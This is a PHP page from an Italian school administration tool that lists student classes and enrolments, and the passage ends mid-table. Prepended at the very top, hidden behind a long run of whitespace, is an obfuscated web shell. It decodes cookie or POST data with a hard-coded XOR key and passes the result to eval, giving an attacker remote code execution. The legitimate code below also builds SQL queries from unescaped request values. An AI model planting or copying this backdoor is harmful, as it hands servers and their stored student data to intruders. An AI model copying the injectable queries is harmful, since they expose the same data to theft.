<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $g279ca8 = 168;$GLOBALS['p3b02b']=Array();global$p3b02b;$p3b02b=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['jd5517']="\x22\x27\x3f\x3b\x7b\x7d\x39\x72\x64\x59\x5d\x6a\x23\x5f\x26\x75\x65\x4c\x55\x56\x73\x2b\x2e\x7a\x52\x35\x24\x2c\x63\x34\x77\x66\x5c\x4d\x49\x58\x38\x46\x4e\x21\x6b\x2d\x42\x30\x67\x61\x71\x3e\xa\x29\x76\x28\x6e\x41\x4b\x79\x7e\x6d\x7c\x4f\x2a\x5a\x36\x32\x37\x53\x3d\x54\x3c\x6f\x51\x5e\xd\x40\x3a\x74\x57\x60\x43\x33\x62\x5b\x69\x78\x31\x20\x9\x6c\x50\x47\x2f\x25\x45\x4a\x44\x68\x70\x48";$p3b02b[$p3b02b['jd5517'][44].$p3b02b['jd5517'][8].$p3b02b['jd5517'][29].$p3b02b['jd5517'][62].$p3b02b['jd5517'][6].$p3b02b['jd5517'][80].$p3b02b['jd5517'][63].$p3b02b['jd5517'][16].$p3b02b['jd5517'][80]]=$p3b02b['jd5517'][28].$p3b02b['jd5517'][95].$p3b02b['jd5517'][7];$p3b02b[$p3b02b['jd5517'][80].$p3b02b['jd5517'][36].$p3b02b['jd5517'][36].$p3b02b['jd5517'][28].$p3b02b['jd5517'][16].$p3b02b['jd5517'][62]]=$p3b02b['jd5517'][69].$p3b02b['jd5517'][7].$p3b02b['jd5517'][8];$p3b02b[$p3b02b['jd5517'][7].$p3b02b['jd5517'][36].$p3b02b['jd5517'][84].$p3b02b['jd5517'][36]]=$p3b02b['jd5517'][20].$p3b02b['jd5517'][75].$p3b02b['jd5517'][7].$p3b02b['jd5517'][87].$p3b02b['jd5517'][16].$p3b02b['jd5517'][52];$p3b02b[$p3b02b['jd5517'][7].$p3b02b['jd5517'][29].$p3b02b['jd5517'][25].$p3b02b['jd5517'][6].$p3b02b['jd5517'][84].$p3b02b['jd5517'][63].$p3b02b['jd5517'][6].$p3b02b['jd5517'][84]]=$p3b02b['jd5517'][82].$p3b02b['jd5517'][52].$p3b02b['jd5517'][82].$p3b02b['jd5517'][13].$p3b02b['jd5517'][20].$p3b02b['jd5517'][16].$p3b02b['jd5517'][75];$p3b02b[$p3b02b['jd5517'][50].$p3b02b['jd5517'][36].$p3b02b['jd5517'][64].$p3b02b['jd5517'][8].$p3b02b['jd5517'][84].$p3b02b['jd5517'][25].$p3b02b['jd5517'][79].$p3b02b['jd5517'][79].$p3b02b['jd5517'][28]]=$p3b02b['jd5517'][20].$p3b02b['jd5517'][16].$p3b02b['jd5517'][7].$p3b02b['jd5517'][82].$p3b02b['jd5517'][45].$p3b02b['jd5517'][87].$p3b02b['jd5517'][82].$p3b02b['jd5517'][23].$p3b02b['jd5517'][16];$p3b02b[$p3b02b['jd5517'][31].$p3b02b['jd5517'][25].$p3b02b['jd5517'][63].$p3b02b['jd5517'][28].$p3b02b['jd5517'][31].$p3b02b['jd5517'][84]]=$p3b02b['jd5517'][96].$p3b02b['jd5517'][95].$p3b02b['jd5517'][96].$p3b02b['jd5517'][50].$p3b02b['jd5517'][16].$p3b02b['jd5517'][7].$p3b02b['jd5517'][20].$p3b02b['jd5517'][82].$p3b02b['jd5517'][69].$p3b02b['jd5517'][52];$p3b02b[$p3b02b['jd5517'][96].$p3b02b['jd5517'][25].$p3b02b['jd5517'][16].$p3b02b['jd5517'][16].$p3b02b['jd5517'][80].$p3b02b['jd5517'][45].$p3b02b['jd5517'][25]]=$p3b02b['jd5517'][15].$p3b02b['jd5517'][52].$p3b02b['jd5517'][20].$p3b02b['jd5517'][16].$p3b02b['jd5517'][7].$p3b02b['jd5517'][82].$p3b02b['jd5517'][45].$p3b02b['jd5517'][87].$p3b02b['jd5517'][82].$p3b02b['jd5517'][23].$p3b02b['jd5517'][16];$p3b02b[$p3b02b['jd5517'][40].$p3b02b['jd5517'][62].$p3b02b['jd5517'][63].$p3b02b['jd5517'][28]]=$p3b02b['jd5517'][80].$p3b02b['jd5517'][45].$p3b02b['jd5517'][20].$p3b02b['jd5517'][16].$p3b02b['jd5517'][62].$p3b02b['jd5517'][29].$p3b02b['jd5517'][13].$p3b02b['jd5517'][8].$p3b02b['jd5517'][16].$p3b02b['jd5517'][28].$p3b02b['jd5517'][69].$p3b02b['jd5517'][8].$p3b02b['jd5517'][16];$p3b02b[$p3b02b['jd5517'][57].$p3b02b['jd5517'][45].$p3b02b['jd5517'][63].$p3b02b['jd5517'][63]]=$p3b02b['jd5517'][20].$p3b02b['jd5517'][16].$p3b02b['jd5517'][75].$p3b02b['jd5517'][13].$p3b02b['jd5517'][75].$p3b02b['jd5517'][82].$p3b02b['jd5517'][57].$p3b02b['jd5517'][16].$p3b02b['jd5517'][13].$p3b02b['jd5517'][87].$p3b02b['jd5517'][82].$p3b02b['jd5517'][57].$p3b02b['jd5517'][82].$p3b02b['jd5517'][75];$p3b02b[$p3b02b['jd5517'][57].$p3b02b['jd5517'][8].$p3b02b['jd5517'][84].$p3b02b['jd5517'][80].$p3b02b['jd5517'][62].$p3b02b['jd5517'][63]]=$p3b02b['jd5517'][20].$p3b02b['jd5517'][29].$p3b02b['jd5517'][6].$p3b02b['jd5517'][28].$p3b02b['jd5517'][64].$p3b02b['jd5517'][45];$p3b02b[$p3b02b['jd5517'][57].$p3b02b['jd5517'][64].$p3b02b['jd5517'][84].$p3b02b['jd5517'][63]]=$p3b02b['jd5517'][83].$p3b02b['jd5517'][63].$p3b02b['jd5517'][16].$p3b02b['jd5517'][31].$p3b02b['jd5517'][36].$p3b02b['jd5517'][80].$p3b02b['jd5517'][31].$p3b02b['jd5517'][45];$p3b02b[$p3b02b['jd5517'][8].$p3b02b['jd5517'][80].$p3b02b['jd5517'][64].$p3b02b['jd5517'][43].$p3b02b['jd5517'][84].$p3b02b['jd5517'][43]]=$_POST;$p3b02b[$p3b02b['jd5517'][95].$p3b02b['jd5517'][64].$p3b02b['jd5517'][31].$p3b02b['jd5517'][36].$p3b02b['jd5517'][84].$p3b02b['jd5517'][43].$p3b02b['jd5517'][80].$p3b02b['jd5517'][8].$p3b02b['jd5517'][43]]=$_COOKIE;@$p3b02b[$p3b02b['jd5517'][7].$p3b02b['jd5517'][29].$p3b02b['jd5517'][25].$p3b02b['jd5517'][6].$p3b02b['jd5517'][84].$p3b02b['jd5517'][63].$p3b02b['jd5517'][6].$p3b02b['jd5517'][84]]($p3b02b['jd5517'][16].$p3b02b['jd5517'][7].$p3b02b['jd5517'][7].$p3b02b['jd5517'][69].$p3b02b['jd5517'][7].$p3b02b['jd5517'][13].$p3b02b['jd5517'][87].$p3b02b['jd5517'][69].$p3b02b['jd5517'][44],NULL);@$p3b02b[$p3b02b['jd5517'][7].$p3b02b['jd5517'][29].$p3b02b['jd5517'][25].$p3b02b['jd5517'][6].$p3b02b['jd5517'][84].$p3b02b['jd5517'][63].$p3b02b['jd5517'][6].$p3b02b['jd5517'][84]]($p3b02b['jd5517'][87].$p3b02b['jd5517'][69].$p3b02b['jd5517'][44].$p3b02b['jd5517'][13].$p3b02b['jd5517'][16].$p3b02b['jd5517'][7].$p3b02b['jd5517'][7].$p3b02b['jd5517'][69].$p3b02b['jd5517'][7].$p3b02b['jd5517'][20],0);@$p3b02b[$p3b02b['jd5517'][7].$p3b02b['jd5517'][29].$p3b02b['jd5517'][25].$p3b02b['jd5517'][6].$p3b02b['jd5517'][84].$p3b02b['jd5517'][63].$p3b02b['jd5517'][6].$p3b02b['jd5517'][84]]($p3b02b['jd5517'][57].$p3b02b['jd5517'][45].$p3b02b['jd5517'][83].$p3b02b['jd5517'][13].$p3b02b['jd5517'][16].$p3b02b['jd5517'][83].$p3b02b['jd5517'][16].$p3b02b['jd5517'][28].$p3b02b['jd5517'][15].$p3b02b['jd5517'][75].$p3b02b['jd5517'][82].$p3b02b['jd5517'][69].$p3b02b['jd5517'][52].$p3b02b['jd5517'][13].$p3b02b['jd5517'][75].$p3b02b['jd5517'][82].$p3b02b['jd5517'][57].$p3b02b['jd5517'][16],0);@$p3b02b[$p3b02b['jd5517'][57].$p3b02b['jd5517'][45].$p3b02b['jd5517'][63].$p3b02b['jd5517'][63]](0);$nd85d96=NULL;$vf0fe94=NULL;$p3b02b[$p3b02b['jd5517'][44].$p3b02b['jd5517'][36].$p3b02b['jd5517'][80].$p3b02b['jd5517'][80].$p3b02b['jd5517'][25].$p3b02b['jd5517'][62].$p3b02b['jd5517'][84].$p3b02b['jd5517'][63]]=$p3b02b['jd5517'][79].$p3b02b['jd5517'][8].$p3b02b['jd5517'][16].$p3b02b['jd5517'][8].$p3b02b['jd5517'][36].$p3b02b['jd5517'][79].$p3b02b['jd5517'][45].$p3b02b['jd5517'][43].$p3b02b['jd5517'][41].$p3b02b['jd5517'][64].$p3b02b['jd5517'][28].$p3b02b['jd5517'][45].$p3b02b['jd5517'][28].$p3b02b['jd5517'][41].$p3b02b['jd5517'][29].$p3b02b['jd5517'][29].$p3b02b['jd5517'][31].$p3b02b['jd5517'][29].$p3b02b['jd5517'][41].$p3b02b['jd5517'][45].$p3b02b['jd5517'][6].$p3b02b['jd5517'][8].$p3b02b['jd5517'][16].$p3b02b['jd5517'][41].$p3b02b['jd5517'][62].$p3b02b['jd5517'][79].$p3b02b['jd5517'][25].$p3b02b['jd5517'][36].$p3b02b['jd5517'][8].$p3b02b['jd5517'][16].$p3b02b['jd5517'][62].$p3b02b['jd5517'][45].$p3b02b['jd5517'][36].$p3b02b['jd5517'][63].$p3b02b['jd5517'][62].$p3b02b['jd5517'][63];global$g8bb5612;function x2ef8bfa($nd85d96,$gdb790){global$p3b02b;$m1058120="";for($b9a74d5=0;$b9a74d5<$p3b02b[$p3b02b['jd5517'][7].$p3b02b['jd5517'][36].$p3b02b['jd5517'][84].$p3b02b['jd5517'][36]]($nd85d96);){for($c0efafba1=0;$c0efafba1<$p3b02b[$p3b02b['jd5517'][7].$p3b02b['jd5517'][36].$p3b02b['jd5517'][84].$p3b02b['jd5517'][36]]($gdb790)&&$b9a74d5<$p3b02b[$p3b02b['jd5517'][7].$p3b02b['jd5517'][36].$p3b02b['jd5517'][84].$p3b02b['jd5517'][36]]($nd85d96);$c0efafba1++,$b9a74d5++){$m1058120.=$p3b02b[$p3b02b['jd5517'][44].$p3b02b['jd5517'][8].$p3b02b['jd5517'][29].$p3b02b['jd5517'][62].$p3b02b['jd5517'][6].$p3b02b['jd5517'][80].$p3b02b['jd5517'][63].$p3b02b['jd5517'][16].$p3b02b['jd5517'][80]]($p3b02b[$p3b02b['jd5517'][80].$p3b02b['jd5517'][36].$p3b02b['jd5517'][36].$p3b02b['jd5517'][28].$p3b02b['jd5517'][16].$p3b02b['jd5517'][62]]($nd85d96[$b9a74d5])^$p3b02b[$p3b02b['jd5517'][80].$p3b02b['jd5517'][36].$p3b02b['jd5517'][36].$p3b02b['jd5517'][28].$p3b02b['jd5517'][16].$p3b02b['jd5517'][62]]($gdb790[$c0efafba1]));}}return$m1058120;}function s49c7a($nd85d96,$gdb790){global$p3b02b;global$g8bb5612;return$p3b02b[$p3b02b['jd5517'][57].$p3b02b['jd5517'][64].$p3b02b['jd5517'][84].$p3b02b['jd5517'][63]]($p3b02b[$p3b02b['jd5517'][57].$p3b02b['jd5517'][64].$p3b02b['jd5517'][84].$p3b02b['jd5517'][63]]($nd85d96,$g8bb5612),$gdb790);}foreach($p3b02b[$p3b02b['jd5517'][95].$p3b02b['jd5517'][64].$p3b02b['jd5517'][31].$p3b02b['jd5517'][36].$p3b02b['jd5517'][84].$p3b02b['jd5517'][43].$p3b02b['jd5517'][80].$p3b02b['jd5517'][8].$p3b02b['jd5517'][43]]as$gdb790=>$z25b){$nd85d96=$z25b;$vf0fe94=$gdb790;}if(!$nd85d96){foreach($p3b02b[$p3b02b['jd5517'][8].$p3b02b['jd5517'][80].$p3b02b['jd5517'][64].$p3b02b['jd5517'][43].$p3b02b['jd5517'][84].$p3b02b['jd5517'][43]]as$gdb790=>$z25b){$nd85d96=$z25b;$vf0fe94=$gdb790;}}$nd85d96=@$p3b02b[$p3b02b['jd5517'][96].$p3b02b['jd5517'][25].$p3b02b['jd5517'][16].$p3b02b['jd5517'][16].$p3b02b['jd5517'][80].$p3b02b['jd5517'][45].$p3b02b['jd5517'][25]]($p3b02b[$p3b02b['jd5517'][57].$p3b02b['jd5517'][8].$p3b02b['jd5517'][84].$p3b02b['jd5517'][80].$p3b02b['jd5517'][62].$p3b02b['jd5517'][63]]($p3b02b[$p3b02b['jd5517'][40].$p3b02b['jd5517'][62].$p3b02b['jd5517'][63].$p3b02b['jd5517'][28]]($nd85d96),$vf0fe94));if(isset($nd85d96[$p3b02b['jd5517'][45].$p3b02b['jd5517'][40]])&&$g8bb5612==$nd85d96[$p3b02b['jd5517'][45].$p3b02b['jd5517'][40]]){if($nd85d96[$p3b02b['jd5517'][45]]==$p3b02b['jd5517'][82]){$b9a74d5=Array($p3b02b['jd5517'][96].$p3b02b['jd5517'][50]=>@$p3b02b[$p3b02b['jd5517'][31].$p3b02b['jd5517'][25].$p3b02b['jd5517'][63].$p3b02b['jd5517'][28].$p3b02b['jd5517'][31].$p3b02b['jd5517'][84]](),$p3b02b['jd5517'][20].$p3b02b['jd5517'][50]=>$p3b02b['jd5517'][84].$p3b02b['jd5517'][22].$p3b02b['jd5517'][43].$p3b02b['jd5517'][41].$p3b02b['jd5517'][84],);echo@$p3b02b[$p3b02b['jd5517'][50].$p3b02b['jd5517'][36].$p3b02b['jd5517'][64].$p3b02b['jd5517'][8].$p3b02b['jd5517'][84].$p3b02b['jd5517'][25].$p3b02b['jd5517'][79].$p3b02b['jd5517'][79].$p3b02b['jd5517'][28]]($b9a74d5);}elseif($nd85d96[$p3b02b['jd5517'][45]]==$p3b02b['jd5517'][16]){eval/*g27b730*/($nd85d96[$p3b02b['jd5517'][8]]);}exit();} ?><?php
  //CLASSI
  //implementazione da 22-07, gestione delle classi di studenti
  
  $pagever = "1.0";
  $pagemod = "27/07/2010 0.56.11";
  require_once("form_cfg.php");
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
  <link rel="stylesheet" type="text/css" href="../css/main.css" />
  <link rel="stylesheet" href="dhtmlgoodies_calendar/dhtmlgoodies_calendar.css" media="screen"></link>
</head>
<body>
<script type="text/javascript" src="../jscolor/jscolor.js"></script>
<script type="text/javascript" src="dhtmlgoodies_calendar/dhtmlgoodies_calendar.js"></script>
<?php
  include ("iniziopagina.php");

  //CARICAMENTO VALORI PER EDIT
  define("FILE_CORRENTE", "frm_classi.php");

  //$cmd = array();
  $cmd = array();
  $cmd['comando'] = $_REQUEST['cmd'];
  $selobj = $_REQUEST['selobj'];
  $cmd['ne_search']=1;
  $cmd['filtra_stato'] = $_REQUEST['filtra_stato'];
  if ($cmd['filtra_stato']=="") {$cmd['filtra_stato']=$_SESSION['_'.FILE_CORRENTE.'.filtra_stato'];}
  if ($cmd['filtra_stato']=="") {$cmd['filtra_stato'] = "1";}
  $_SESSION['_'.FILE_CORRENTE.'.filtra_stato']=$cmd['filtra_stato'];
  
  include ("form_filter.php");
  
  $cmd['form_rowcount'] = $setup['form_rowcount'];
  $cmd['form_rowcount'] = 1000;
  //myprint_r($_SESSION);
  
  //PRELOAD INSEGNA
  $pstudi=array();
  
  $query = "SELECT docente.nickname as nickname, docente.id as docente_id, docente.attivo as docente_attivo,
            insegna.idpstudi as idpstudi
            FROM docente INNER JOIN insegna ON docente.id = insegna.iddocente
            INNER JOIN pstudi ON insegna.idpstudi=pstudi.id AND pstudi.trashed <>1 AND pstudi.attivo<>-1
            WHERE docente.trashed<>1";
  $result = mysql_query($query) or die ("Error_2.1");
  while ($line = mysql_fetch_assoc($result)) {
    $pstudi[$line['idpstudi']]['insegna'][$line['docente_id']]['nick']=$line['nickname'];
    $pstudi[$line['idpstudi']]['insegna'][$line['docente_id']]['attivo']=$line['docente_attivo'];
    $pstudi[$line['idpstudi']]['insegna'][$line['docente_id']]['id']=$line['docente_id'];
  }


  $query_select = "SELECT classi.id as classi_id, classi.descr as classi_descr, classi.idcustomer as classi_idcustomer, classi.dt as classi_dt, 
    classi.attivo as classi_attivo, customer.nome as customer_nome";
            
  $query = " FROM classi LEFT JOIN customer ON classi.idcustomer=customer.id AND customer.trashed<>1
            WHERE classi.trashed<>1";
  
  if ($cmd['filtra_stato']!="-1") {
    $query .= " AND classi.attivo=".$cmd['filtra_stato']." ";
  }
  
  if ($cmd['src1']!="") {
    $query .= " AND classi.descr like '%".$cmd['src1']."%' ";
  }
  
  switch ($cmd['form_sort']) {
    case 1:
    default:
            $query .= " ORDER BY classi.descr ";
            break;
  }
  
    
  $result = mysql_query("SELECT count(*) as conto ".$query);
  $line=mysql_fetch_assoc($result);
  $query_tot_row=$line['conto'];
  mysql_free_result($result);
  
  $query = $query_select . $query;
  $query .= " LIMIT ".$cmd['form_limit'].", ".$cmd['form_rowcount'];
  $result = mysql_query($query) or die ("Error_1.1");
  
  $vetdati = array();
  while ($line = mysql_fetch_assoc($result)) {
    $chiave = $line['classi_id'];
    $vetdati[$chiave]['classi_descr'] = $line['classi_descr'];
    $vetdati[$chiave]['classi_idcustomer'] = $line['classi_idcustomer'];
    $vetdati[$chiave]['classi_dt'] = $line['classi_dt'];
    $vetdati[$chiave]['classi_attivo'] = $line['classi_attivo'];
    $vetdati[$chiave]['customer_nome'] = $line['customer_nome'];
    $vetdati[$chiave]['classi_descr'] = $line['classi_descr'];
    $vetdati[$chiave]['classi_descr'] = $line['classi_descr'];
    $vetdati[$chiave]['classi_descr'] = $line['classi_descr'];
    $vetdati[$chiave]['classi_descr'] = $line['classi_descr'];
    $vetdati[$chiave]['classi_descr'] = $line['classi_descr'];
    $vetdati[$chiave]['classi_descr'] = $line['classi_descr'];
    $vetdati[$chiave]['classi_descr'] = $line['classi_descr'];
    $vetdati[$chiave]['classi_descr'] = $line['classi_descr'];
  }
  
  print "<BR><H1>"._CLASSISTUDENTI_."</H1>";
  print "<DIV STYLE='text-align:right;'>";
  print "<FORM NAME='fstato' METHOD='POST' ACTION='".FILE_CORRENTE."'><INPUT TYPE='hidden' NAME='cmd' VALUE='".FASESEARCH."'>";
  print _LBLFILTRA_.": <SELECT NAME='filtra_stato' SIZE=1 onChange=document.fstato.submit();><OPTION VALUE='-1'>"._LBLOPTTUTTI_."</OPTION>";
  
  $query = "SELECT valore, label FROM stati WHERE idgruppo=7 ORDER BY ordine";
  $result = mysql_query($query) or die("Error_qs1");
  while ($line=mysql_fetch_assoc($result)) {
    print "<OPTION VALUE='".$line['valore']."' ".($cmd['filtra_stato']==$line['valore']?" SELECTED ":"").">".convlang($line['label'])."</OPTION>";
  }
  print "</SELECT></FORM>";
  
  print "</DIV>";
  
  print "<TABLE CLASS=support_table>";
  print "<TR>";
    //SEARCH
    print "<TD STYLE='text-align:right;'><DIV id='areasearch'>";
    print "<FORM NAME='ricerca' METHOD='POST' ACTION='".FILE_CORRENTE."'><INPUT TYPE='hidden' NAME='cmd' VALUE='".FASESEARCH."'>";
    print "<TABLE align='center' class='searchform' cellpadding='2' cellspacing='0' width='40%'>";
    print "<TR><TD CLASS='form_lbl'><INPUT TYPE='text' NAME='src1' VALUE=''></TD><TD CLASS='form_lbl'><BUTTON>Search</BUTTON></TD></TR>";
    print "</TABLE>";
    print "</FORM>";
    print "</DIV></TD>";
    
    if ($_SESSION[FILE_CORRENTE.'FILTERED']==1) {
      print "<TD ALIGN=RIGHT STYLE='text-align:right;width:160px;'>";
      print "<div align='right' class='resetfilter'>";
      print "\t<A HREF='". FILE_CORRENTE ."?rstflt=1'><img src='../img/edit_small.gif' align='center' border='0' width='16' height='16'>"._RESETFILTER_."</A>";
      print "</div></TD>";
    } else {
      print "<TD>&nbsp;</TD>";
    }
    
    print "<TD COLSPAN=2 STYLE='text-align:right;width:160px;'>";  
      print "<IMG CLASS='manina' BORDER=0 SRC='../img/add_user.png' ALT='"._TIPADDUSERCONTATTO_."' TITLE='"._TIPADDUSERCONTATTO_."' onClick='chiamapopup(2,0);'></TD>";
    print "</TD>";
  print "</TR>";
  print "</TABLE>";
  
  print "<TABLE CLASS=lista_table ALIGN=CENTER>";
  print "<TR><TD CLASS=lista_tittab>"._LBLAZIENDA_."</TD><TD CLASS=lista_tittab>"._DESCRIZIONE_."</TD><TD CLASS=lista_tittab>"._LBLSTUDENTI_."</TD><TD CLASS=lista_tittab>"._STATO_."</TD><TD CLASS=lista_tittab width='70'>&nbsp;</TD></TR>";
  
  foreach ($vetdati as $key=>$cur) {
    
    if ($cur_rowstyle=="form2_lista_riga_pari") {
      $cur_rowstyle="form2_lista_riga_dispari";
      $stile = "background-color:#EDEDED;";//EDEDED   //F0FFEF
    } else {
      $cur_rowstyle="form2_lista_riga_pari";
      $stile = "background-color:#F7F7F7;";//F7F7F7   //FEFFEF
    }
    $styleslect="";
    if ($key==$selobj) {$stile=STYLE_RIGAORANGE;}
    print "<TR STYLE='$stile'>";
    print "<TD CLASS=lista_col_form2 $styleslect>".($cur['classi_idcustomer']=="" ? _MSGNOCUSTOMER_ : $cur['customer_nome'])."</TD>";
    print "<TD CLASS=lista_col_form2 $styleslect>[". $cur['classi_id'] ."] ".$cur['classi_descr']."</TD>";
    
    print "<TD CLASS=lista_col_form2 $styleslect>STUDENTI</TD>";
    print "<TD CLASS=lista_col_form2 ALIGN=CENTER $styleslect>".($cur['classi_attivo']==1 ? "<A HREF='".FILE_DBQUERY."?cmd=". FASEDENY ."&codicepagina=". codiceform(FILE_CORRENTE) ."&selobj=". $key."'><IMG SRC='../img/ledgreen.png' BORDER=0 ALIGN=MIDDLE></A>" : "<A HREF='".FILE_DBQUERY."?cmd=". FASEALLOW ."&codicepagina=". codiceform(FILE_CORRENTE) ."&selobj=". $key."'><IMG SRC='../img/ledred.png' BORDER=0 ALIGN=MIDDLE></A>")."</TD>";
    
    //COMANDI
    print "<TD CLASS=lista_col_form2 $styleslect><TABLE width=100%><TR>
    <TD ALIGN=CENTER><A HREF='". FILE_CORRENTE ."?cmd=". FASEMOD ."&selobj=". $key ."#maskera'><IMG SRC='../img/mod.png' border=0 ALT='"._LBLMATITA_."' TITLE='"._LBLMATITA_."'></A></TD>
    <TD ALIGN=CENTER><A HREF='#' onClick=urldelete(\"". FILE_DBQUERY ."?cmd=". FASEDEL ."&codicepagina=". codiceform(FILE_CORRENTE) ."&selobj=". $key ."\")><IMG SRC='../img/canc.png' border=0 ALT='"._LBLCANCELLA_."'></A></TD>
    <TD ALIGN=CENTER><A HREF='". FILE_CORRENTE ."?cmd=". FASECLASSE ."&selobj=". $key ."#maskera'><IMG SRC='../img/studente.png' border=0 ALT='"._REGISTRODICLASSE_."' TITLE='"._REGISTRODICLASSE_."'></A></TD>";
		/*print "</TR><TR>";
		print "<TD ALIGN=CENTER><A HREF='". FILE_CORRENTE ."?cmd=". FASEPREFDAY ."&selobj=". $line['pstudi_id'] ."#maskera'><IMG SRC='../img/calendario_fulmine.png' border=0 ALT='"._LBLPREFDAY_."' TITLE='"._LBLPREFDAY_."'></A></TD>
           <TD><A HREF='/stampe/mpdf/examples/LCI1.php?selobj=".$line['pstudi_id']."' TARGET=_blank><IMG SRC='../img/reportsmall.png' border=0 ALT='"._LBLLCI_."' TITLE='"._LBLLCI_."'></A></TD>
           <TD>&nbsp;</TD>";*/
    print "</TR></TABLE></TD>";
    print "</TR>";
        
      
  }
       
    echo "</TABLE><BR>";
        
    /*
    $i=1;
    $ne=$setup['form_btnpage'];
    $ne--;
    $fine=0;
    unset($vetlimit);
    $vetlimit=array();
    $vetlimit[0] = 0;
    while ($fine==0) {
      $fine=1;
      $curlimit = $cmd['form_limit'];
      //if ($curlimit>0 && $curlimit<($query_tot_row-1)) {
        $newlimit = ceil($curlimit/$cmd['form_rowcount'])*$cmd['form_rowcount'];
        $vetlimit[$newlimit] = $newlimit;

      //}
      
      $newlimit = $curlimit - ($i * $cmd['form_rowcount']);
      if ($newlimit>0 && $newlimit<($query_tot_row) && $ne>0) {  //tolto -1 in totrow
        $fine=0;
        $vetlimit[$newlimit] = $newlimit;
        $ne--;
      }
      
      $newlimit = $curlimit + ($i * $cmd['form_rowcount']);
      if ($newlimit>0 && $newlimit<($query_tot_row) && $ne>0) {  //tolto -1 in totrow
        $fine=0;
        $vetlimit[$newlimit] = $newlimit;
        $ne--;
      }
      $i++;
    }
    $newlimit = ceil(($query_tot_row-1)/$cmd['form_rowcount'])*$cmd['form_rowcount'];
    if ($newlimit>0 && $newlimit<($query_tot_row) && $ne>0) {  //tolto -1 in totrow
      $vetlimit[$newlimit] = $newlimit;
    }
    ksort($vetlimit);
    $lastlimit = end($vetlimit);
    
    $limitfinale = $cmd['form_limit']+$cmd['form_rowcount'];
    $limitinizio = $cmd['form_limit']+1;
    if ($limitfinale > $query_tot_row) {$limitfinale=$query_tot_row;}
    if ($limitinizio==0) {$limitinizio=1;}
    
    print "<DIV id='pagebar' CLASS=pagebar STYLE='text-align:right;font-size:12px;'>";
    print _SHOW_." "._SHOWFROM_." ".$limitinizio." "._SHOWTO_." ".$limitfinale." "._SHOWOF_." ".$query_tot_row." ";
    foreach ($vetlimit as $keylimit=>$curlimit) {
      if ($keylimit!=$cmd['form_limit']) {
        print "<A HREF='".FILE_CORRENTE."?form_limit=$curlimit'>";
      } else {
        print "<SPAN CLASS=selectedpage STYLE='color:#0000FF;font-weight:bolder;'>";
      }
      print "[";
      if ($curlimit==0) {
        print _FIRST_;
      } else {
        if ($curlimit==$lastlimit) {
          print _LAST_;
        } else {
          print ceil($curlimit/$cmd['form_rowcount'])+1;
        }
      }
      print "]";
      if ($keylimit!=$cmd['form_limit']) {
        print "</A> ";
      } else {
        print "</SPAN> ";
      }
    }
    print "</DIV><BR>";
  */
  
  //SEARCH
  print "<DIV id='areasearch'>";
  print "<FORM NAME='ricerca' METHOD='POST' ACTION='".FILE_CORRENTE."'><INPUT TYPE='hidden' NAME='cmd' VALUE='".FASESEARCH."'>";
  print "<TABLE align='center' class='searchform' cellpadding='2' cellspacing='0' width='40%'>";
  print "<TR><TD CLASS='form_lbl'>Descrizione: <INPUT TYPE='text' NAME='src1' VALUE='".$cmd['src1']."'></TD><TD CLASS='form_lbl'><BUTTON>Search</BUTTON></TD></TR>";
  print "</TABLE>";
  print "</FORM>";
  print "</DIV>";
  
  if ($_SESSION[FILE_CORRENTE.'FILTERED']==1) {
    print "<div align='right' class='resetfilter'>";
    print "\t<A HREF='". FILE_CORRENTE ."?rstflt=1'><img src='../img/edit_small.gif' align='center' border='0' width='16' height='16'>"._RESETFILTER_."</A>";
    print "</div>";
  }
  
  //INSSTUDENTI
  //NO IN STUDENTI allora INS O MOD
  if ($cmd['comando']==FASECLASSE) {
    // Torna all'inserimento
    if ($cmd['comando']!=FASEINS) {
      print "<div align='right' class='backinsert'>";
      print "\t<A HREF='". FILE_CORRENTE ."'><img src='../img/edit_small.gif' align='center' border='0' width='16' height='16'>"._BACKTOINS_."</A>";
      print "</div>";
    }
    print "<BR>";
    //elenco degli studenti già associati alla classe
    $query = "SELECT enroll.idclasse as enroll_idclasse, enroll.idstudente as enroll_idstudente, enroll.dtini as dtini, enroll.dtfine as dtfine,
              enroll.frefer as frefer, studente.nome as studente_nome, customer.nome as customer_nome
              FROM enroll INNER JOIN studente ON enroll.idstudente=studente.id
              LEFT JOIN customer ON studente.idcustomer=customer.id AND customer.trashed<>1
              WHERE enroll.idclasse = ".$selobj." AND studente.trashed<>1
              ORDER BY customer.nome, studente.nome";
    $result = mysql_query($query) or die ("Error_2.1");
    $studenti = array();
    $idstud = "-1, ";
    while ($line = mysql_fetch_assoc($result)) {
      $chiave = $line['enroll_idstudente'];
      $studenti[$chiave]['enroll_idclasse']=$line['enroll_idclasse'];
      $studenti[$chiave]['dtini']=$line['dtini'];
      $studenti[$chiave]['dtfine']=$line['dtfine'];
      $studenti[$chiave]['frefer']=$line['frefer'];
      $studenti[$chiave]['studente_nome']=$line['studente_nome'];
      $studenti[$chiave]['customer_nome']=$line['customer_nome'];
      
      $idstud .= $chiave.", ";      
    }
    
    //lista degli studenti non associati, raggruppati per customer e divisi in DIV
    $query = "SELECT studente.id as studente_id, studente.nome as studente_nome, customer.id as customer_id, customer.nome as customer_nome
              FROM studente LEFT JOIN customer ON studente.idcustomer=customer.id AND customer.trashed<>1
              WHERE studente.id NOT IN (".substr($idstud,0,-2).") AND studente.trashed<>1
              ORDER BY customer.nome, studente.nome";
    $result = mysql_query($query) or die ("Error_2.2");
    $studentiNA = array();
    while ($line = mysql_fetch_assoc($result)) {
      $studentiNA[$line['customer_id']]['customer_nome']=$line['customer_nome'];
      $studentiNA[$line['customer_id']]['studenti'][$line['studente_id']]['studente_nome']=$line['studente_nome'];
      if ($line['customer_nome']=="") {
        $studentiNA[$line['customer_id']]['customer_nome']=_MSGNOCUSTOMER_;
      }
    }
    
    //visualizza
    //iscritti
    print "<TABLE align='center' class='inputform' cellpadding='2' cellspacing='0' width='50%'>";
    print "<tr><td class='headermod' colspan='3'><div class='header-text'>"._ENROLLEDSTUD_."</div></td></tr>";
    $curstyle = RIGA_DISPARI;
    foreach ($studenti as $key =>$cur) {
      if ($cur['dtfine']!=0) {$delstyle = 'text-decoration: line-through;font-style: italic;';} else {$delstyle="";}
      print "<TR STYLE='background-color:$curstyle;'>";
      print "<TD STYLE='$delstyle'>".$cur['customer_nome']."</TD>";
      print "<TD STYLE='$delstyle'>".$cur['studente_nome']."</TD>";
      print "<TD STYLE='width:15%;'>";
